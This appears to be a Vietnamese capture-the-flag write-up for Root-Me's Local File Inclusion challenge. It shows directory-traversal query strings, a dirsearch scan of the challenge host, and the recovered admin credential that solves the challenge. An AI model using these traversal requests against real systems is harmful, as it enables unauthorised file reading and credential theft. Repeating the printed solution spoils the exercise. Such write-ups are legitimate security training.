# [Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)

## Solutions

Phân tích GET request query parameters:

- files: đường dẫn folder
- f: tên file

Request:

- `?files=..`: liệt kê các file, directory ở parent directory
- `?files=..&f=index.php`: đọc file `index.php` biết được mình đang ở trong `files` directory

Sử dụng dirsearch để path scan, một số kết quả:

```bash
┌──(kali㉿kali)-[~/Documents/dirsearch]
└─$ python dirsearch.py -u http://challenge01.root-me.org/web-serveur/ch16/

  _|. _ _  _  _  _ _|_    v0.4.2.8
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11458

Output File: /home/kali/Documents/dirsearch/reports/http_challenge01.root-me.org/_web-serveur_ch16__22-09-21_23-07-51.txt

Target: http://challenge01.root-me.org/

[23:07:51] Starting: web-serveur/ch16/
[23:08:00] 403 -  548B  - /web-serveur/ch16/%2e%2e;/test                    
[23:08:46] 301 -  162B  - /web-serveur/ch16/admin  ->  http://challenge01.root-me.org/web-serveur/ch16/admin/
[23:08:50] 401 -   19B  - /web-serveur/ch16/admin/                          
[23:08:50] 403 -  548B  - /web-serveur/ch16/admin/.config                   
[23:08:53] 401 -   19B  - /web-serveur/ch16/admin/index.php                 
[23:10:40] 301 -  162B  - /web-serveur/ch16/files  ->  http://challenge01.root-me.org/web-serveur/ch16/files/
[23:10:40] 403 -  548B  - /web-serveur/ch16/files/
...
```

Ta thấy có file `/web-serveur/ch16/admin/index.php`, để đọc nội dung file này ta request với query là `?files=../admin&f=index.php` => lấy được credential: `admin:OpbNJ60xYpvAQU8`
